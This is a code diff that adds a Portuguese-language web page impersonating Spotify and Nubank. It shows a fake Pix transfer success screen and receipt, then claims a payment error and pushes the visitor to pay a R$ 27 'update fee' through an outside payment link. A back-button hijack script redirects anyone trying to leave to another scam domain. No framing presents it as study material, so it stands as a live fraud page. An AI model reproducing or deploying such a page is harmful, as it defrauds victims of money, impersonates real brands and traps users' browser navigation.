@@ -1,0 +1,156 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotify - Transferência</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
+        body { font-family: 'Inter', sans-serif; margin: 0; overflow-x: hidden; background-color: #000000; }
+        
+        /* Utilitários */
+        .spotify-bg { background-color: #1DB954; }
+        .nubank-bg { background-color: #830AD1; }
+        .hidden { display: none; }
+
+        /* Animação do Box Nubank */
+        #confirmBox {
+            position: fixed;
+            bottom: 0; left: 0; right: 0;
+            background: white;
+            padding: 25px 20px;
+            border-radius: 24px 24px 0 0;
+            box-shadow: 0 -10px 40px rgba(0,0,0,0.15);
+            transform: translateY(100%);
+            transition: transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            z-index: 150;
+        }
+        #confirmBox.active { transform: translateY(0); }
+
+        /* Estilos da Página de Reversão (A que você guardou) */
+        .pulse-red { animation: pulse-red 2s infinite; }
+        @keyframes pulse-red {
+            0% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(220, 38, 38, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0); }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="step1" class="fixed inset-0 bg-[#121212] flex items-center justify-center z-[200]">
+        <div class="w-[90%] max-w-xs text-center">
+            <img src="images/Spotify_Full_Logo_RGB_Green.png" class="h-10 mx-auto mb-10">
+            <div class="w-20 h-20 bg-[#1DB954]/10 rounded-full flex items-center justify-center mx-auto mb-6">
+                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#1DB954" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            </div>
+            <h2 class="text-white text-2xl font-black mb-2">Pix enviado!</h2>
+            <p class="text-gray-400 text-sm mb-8 px-4">O valor de <span class="text-white font-bold">R$ 826,00</span> foi transferido com sucesso.</p>
+            <button onclick="goToStep2()" class="w-full spotify-bg text-black font-black py-4 rounded-full active:scale-95 transition-all uppercase tracking-widest text-sm">
+                Ver comprovante
+            </button>
+        </div>
+    </div>
+
+    <div id="step2" class="hidden bg-white min-h-screen">
+        <div class="max-w-md mx-auto">
+            <div class="flex justify-between items-center px-5 py-6">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2"><path d="M18 6L6 18M6 6l12 12"></path></svg>
+                <img src="images/logo-nu-nubank-roxo-icon-1024.png" class="h-8">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#830AD1" stroke-width="2"><path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8M16 6l-4-4-4 4M12 2v13"></path></svg>
+            </div>
+            <div class="px-7">
+                <h1 class="text-[22px] font-bold text-gray-800 mb-8">Comprovante de transferência</h1>
+                <div class="mb-8">
+                    <p class="text-gray-400 text-sm font-semibold mb-1">Valor</p>
+                    <p class="text-[34px] font-bold text-gray-900">R$ 826,00</p>
+                </div>
+                <div class="space-y-5 text-[15px]">
+                    <div><p class="text-gray-400 text-sm font-semibold">Destinatário</p><p class="font-bold">Maria dos Santos Souza</p><p class="text-gray-500 text-xs">CPF: ***.361.***-**</p></div>
+                    <div class="h-[1px] bg-gray-100"></div>
+                    <div><p class="text-gray-400 text-sm font-semibold">Origem</p><p class="font-bold">Spotify Financial Services</p></div>
+                    <div class="h-[1px] bg-gray-100"></div>
+                    <div><p class="text-gray-400 text-sm font-semibold">Data e Hora</p><p class="font-bold" id="currentDate"></p></div>
+                </div>
+            </div>
+        </div>
+
+        <div id="confirmBox">
+            <h3 class="text-xl font-black text-gray-900 mb-2">Confirma: o Pix é seu?</h3>
+            <p class="text-gray-500 text-[13px] mb-6 leading-relaxed">Identificamos divergência de titularidade. Você reconhece este envio de <b>R$ 826,00</b> para Maria dos Santos?</p>
+            <div class="space-y-3">
+                <button class="w-full border-2 border-gray-100 text-gray-300 font-bold py-4 rounded-full text-xs">SIM, ESSE PIX É MEU</button>
+                <button onclick="goToStep3()" class="w-full nubank-bg text-white font-bold py-4 rounded-full shadow-lg uppercase text-sm tracking-wider">NÃO, NÃO FOI MEU PIX!</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="step3" class="hidden bg-[#f8fafc] min-h-screen">
+        <div class="bg-[#CC0000] text-white text-center py-3 px-4 text-[10px] font-bold uppercase w-full sticky top-0 z-[200]">
+            ⚠️ ERRO NO PROCESSAMENTO: DIVERGÊNCIA DE DADOS IDENTIFICADA PELO SISTEMA BANCÁRIO
+        </div>
+        <div class="max-w-md mx-auto bg-white min-h-screen shadow-2xl pb-10">
+            <div class="flex justify-between items-center px-6 py-6 border-b border-gray-100">
+                <div class="flex flex-col">
+                    <span class="text-[10px] font-bold text-gray-400 uppercase">Saldo Enviado Errado</span>
+                    <span class="text-3xl font-black text-red-600">R$ 826,00</span>
+                </div>
+                <img src="images/Spotify_Full_Logo_RGB_Green.png" class="h-7">
+            </div>
+            <div class="px-6 py-8">
+                <div class="text-center mb-8">
+                    <div class="text-5xl mb-4">🔒</div>
+                    <h1 class="text-2xl font-black text-slate-800 mb-2">Ativação de Proteção Pix</h1>
+                    <p class="text-sm font-medium text-red-600 bg-red-50 py-2 px-4 rounded-lg inline-block">O Pix foi enviado para outra pessoa devido a erro na chave.</p>
+                </div>
+                <div class="bg-gray-50 border-2 border-dashed border-red-200 rounded-3xl p-6 mb-8 text-[14px] text-gray-700">
+                    ⚠️ <b>Atenção:</b> Saques recentes foram revertidos. O sistema identificou que os dados informados não coincidem com o titular.
+                </div>
+                <div class="mb-8 space-y-4">
+                    <label class="block text-[11px] font-black text-gray-400 uppercase">Atualizar Chave Pix Destino:</label>
+                    <input type="text" placeholder="Digite sua Chave Pix CORRETA aqui..." class="w-full p-4 rounded-2xl border-2 border-gray-100 bg-gray-50 font-bold focus:border-[#1DB954] outline-none">
+                </div>
+                <div class="bg-black rounded-3xl p-6 text-white text-center mb-6 pulse-red">
+                    <span class="text-[10px] uppercase font-black opacity-60">Taxa de Atualização de Vaga</span>
+                    <div class="text-4xl font-black my-1">R$ 27,00</div>
+                    <p class="text-[11px] font-bold text-[#1DB954]">LIBERAÇÃO IMEDIATA DO NOVO PIX</p>
+                </div>
+                <a href="https://pay.conexaomaestra.shop/69b46dc0b65583296e4d37f1" class="block w-full bg-[#1DB954] text-white text-center py-6 rounded-2xl shadow-xl font-black text-xl uppercase">✅ CONCLUIR COM SEGURANÇA</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Data do Comprovante
+        const d = new Date();
+        const months = ["Jan", "Fev", "Mar", "Abr", "Mai", "Jun", "Jul", "Ago", "Set", "Out", "Nov", "Dez"];
+        document.getElementById('currentDate').innerText = `${d.getDate()} ${months[d.getMonth()]} ${d.getFullYear()} - ${d.getHours()}:${d.getMinutes().toString().padStart(2, '0')}`;
+
+        function goToStep2() {
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            document.body.style.backgroundColor = "white";
+            setTimeout(() => { document.getElementById('confirmBox').classList.add('active'); }, 2500);
+        }
+
+        function goToStep3() {
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
+            document.body.style.backgroundColor = "#f8fafc";
+            window.scrollTo(0, 0);
+        }
+    </script>
+    
+    <!-- BACK REDIRECT: volta -> redireciona -->
+  <script>
+    (function() {
+      history.pushState(null, '', location.href);
+      window.onpopstate = function () {
+        location.href = "https://acessaragora.shop/branca/back/04/"; // 🟡 Substitua pela URL de redirecionamento
+      };
+    })();
+  </script>
+
+</body></html>
